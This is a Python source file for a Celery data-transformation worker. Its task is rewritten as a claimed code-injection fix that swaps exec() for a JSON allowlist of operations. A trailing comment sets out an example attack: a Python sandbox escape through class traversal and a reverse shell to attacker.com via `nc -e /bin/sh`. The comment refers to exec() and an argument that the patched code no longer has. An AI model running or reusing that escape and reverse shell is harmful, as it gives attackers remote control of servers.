import os
import sqlite3
import logging
from datetime import datetime
from celery import Celery
from celery.exceptions import SoftTimeLimitExceeded

# Configure logging for the Asynchronous Data Analytics Worker
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - AnalyticsWorker - %(levelname)s - %(message)s'
)
logger = logging.getLogger("CeleryDataProcessor")

DB_FILE = "analytics_warehouse.db"

# Initialize Celery application with a Redis broker and backend
app = Celery(
    'data_pipeline',
    broker='redis://localhost:6379/0',
    backend='redis://localhost:6379/1'
)

app.conf.update(
    task_serializer='json',
    accept_content=['json'],
    result_serializer='json',
    timezone='UTC',
    enable_utc=True,
    task_soft_time_limit=60
)

def init_warehouse_db():
    """Initializes the SQLite database for the mock data warehouse."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE raw_datasets (
            dataset_id TEXT PRIMARY KEY,
            uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            data_payload TEXT NOT NULL
        )
    ''')

    cursor.execute('''
        CREATE TABLE processed_results (
            job_id TEXT PRIMARY KEY,
            dataset_id TEXT NOT NULL,
            completed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            result_payload TEXT NOT NULL
        )
    ''')

    # Insert mock datasets (Stored as stringified JSON/CSV representation)
    mock_datasets = [
        ('DS-A100', '{"Q1_Revenue": 15000, "Q2_Revenue": 18500, "Q3_Revenue": 21000}'),
        ('DS-B200', '{"Active_Users": 4500, "Churn_Rate": 0.05, "LTV": 120}'),
        ('DS-C300', '{"Server_Uptime": 99.9, "Error_Count": 42, "Avg_Latency_ms": 45}')
    ]
    cursor.executemany('''
        INSERT INTO raw_datasets (dataset_id, data_payload)
        VALUES (?, ?)
    ''', mock_datasets)

    conn.commit()
    conn.close()
    logger.info("Analytics warehouse database initialized.")

def fetch_dataset(dataset_id: str) -> dict:
    """Retrieves a dataset payload from the warehouse."""
    try:
        import json
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT data_payload FROM raw_datasets WHERE dataset_id = ?", (dataset_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return json.loads(row[0])
    except Exception as e:
        logger.error(f"Error fetching dataset {dataset_id}: {e}")
    return {}

def save_job_result(job_id: str, dataset_id: str, result_dict: dict):
    """Saves the output of a data transformation job."""
    try:
        import json
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO processed_results (job_id, dataset_id, result_payload) VALUES (?, ?, ?)",
            (job_id, dataset_id, json.dumps(result_dict))
        )
        conn.commit()
        conn.close()
        logger.info(f"Saved results for job {job_id}.")
    except Exception as e:
        logger.error(f"Error saving job result {job_id}: {e}")

@app.task(bind=True, name="pipeline.execute_custom_transformation")
def execute_custom_transformation(self, dataset_id: str, transformation_rules: str):
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (exec) with a structured, JSON-based declarative transformation model.
    """
    import json
    
    job_id = self.request.id
    logger.info(f"Starting job {job_id}: Applying secure transformation to {dataset_id}")
    
    raw_data = fetch_dataset(dataset_id)
    if not raw_data:
        logger.error(f"Job {job_id} failed: Dataset {dataset_id} not found or invalid.")
        return {"status": "error", "message": "Dataset not found"}

    try:
        # Secure: We remove the dangerous exec() function entirely.
        # Executing arbitrary code from the message broker is a critical vulnerability.
        # Instead, we implement a declarative data transformation approach where the 
        # client submits a JSON array of strictly defined, allowed operations.
        # Note: The client enqueuing tasks must be updated to send JSON configuration
        # instead of raw Python scripts.
        
        rules = json.loads(transformation_rules)
        if not isinstance(rules, list):
            logger.warning(f"Job {job_id}: Transformation rules must be a JSON list.")
            return {"status": "error", "message": "Invalid rules format"}
            
        # Work on a copy of the data to avoid mutating the original fetched state
        output_data = raw_data.copy()
        
        for rule in rules:
            if not isinstance(rule, dict):
                continue
                
            action = rule.get("action")
            
            # Explicit allowlist of supported safe data transformations
            if action == "rename":
                old_k = rule.get("old_key")
                new_k = rule.get("new_key")
                if old_k in output_data and new_k:
                    output_data[new_k] = output_data.pop(old_k)
                    
            elif action == "drop":
                key = rule.get("key")
                if key in output_data:
                    del output_data[key]
                    
            elif action == "scale":
                key = rule.get("key")
                factor = rule.get("factor")
                # Strictly validate types before performing mathematical operations
                if key in output_data and isinstance(output_data[key], (int, float)) and isinstance(factor, (int, float)):
                    output_data[key] = float(output_data[key] * factor)
                    
            elif action == "add_constant":
                key = rule.get("key")
                value = rule.get("value")
                if key and isinstance(value, (int, float, str)):
                    output_data[key] = value
                    
            else:
                logger.warning(f"Job {job_id}: Ignored unknown or unauthorized action '{action}'.")

        save_job_result(job_id, dataset_id, output_data)
        
        logger.info(f"Job {job_id} completed successfully via secure configuration.")
        return {"status": "success", "processed_keys": len(output_data)}
        
    except json.JSONDecodeError as e:
        logger.error(f"Job {job_id} failed to parse transformation rules as JSON: {e}")
        return {"status": "error", "message": "Invalid JSON configuration"}
    except SoftTimeLimitExceeded:
        logger.error(f"Job {job_id} timed out.")
        return {"status": "error", "message": "Timeout"}
    except Exception as e:
        logger.error(f"Job {job_id} failed during secure execution: {e}")
        return {"status": "error", "message": str(e)}

if __name__ == '__main__':
    init_warehouse_db()
    
    # Example Malicious Trigger:
    # 1. An attacker gains access to the application API that queues these tasks, 
    #    or gains unauthorized write access to the Redis broker.
    # 2. The attacker dispatches a task with a payload designed to escape the sandbox:
    #
    #    from my_app import execute_custom_transformation
    #    
    #    malicious_script = '''
    #    import sys
    #    # Break out of the empty __builtins__ via class traversal
    #    escape = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os')
    #    escape.system('nc -e /bin/sh attacker.com 4444')
    #    output = {"exploited": True}
    #    '''
    #    
    #    execute_custom_transformation.delay(
    #        dataset_id="DS-A100", 
    #        transformation_script=malicious_script
    #    )
    #
    # 3. The Celery worker picks up the task from Redis, calls exec(), and gets compromised.
    
    logger.info("To start the worker, run: celery -A <module_name> worker --loglevel=info")
